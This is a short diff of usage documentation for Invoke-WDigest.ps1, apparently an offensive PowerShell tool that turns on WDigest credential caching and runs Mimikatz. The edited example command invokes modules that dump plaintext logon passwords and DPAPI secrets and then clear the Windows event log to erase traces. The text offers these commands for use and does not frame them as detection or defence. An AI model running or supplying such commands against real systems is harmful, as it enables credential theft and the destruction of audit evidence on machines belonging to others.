@@ -35,7 +35,7 @@ Get-Help .\Invoke-WDigest.ps1 -full
 .\Invoke-WDigest.ps1 -wdigest 'true' -manycats
 
 # Ativate WDigest caching + Exec M[i]mika[t]z 'net::group sekurlsa::wdigest sekurlsa::logonpasswords' multiple dump::modules
-.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'net::group vault::list sekurlsa::wdigest sekurlsa::logonpasswords sekurlsa::dpapi event::clear exit'
+.\Invoke-WDigest.ps1 -wdigest 'true' -manycats -module 'sekurlsa::wdigest sekurlsa::logonpasswords sekurlsa::dpapi event::clear exit'
 
 
 [FAST DEMONSTRATION]
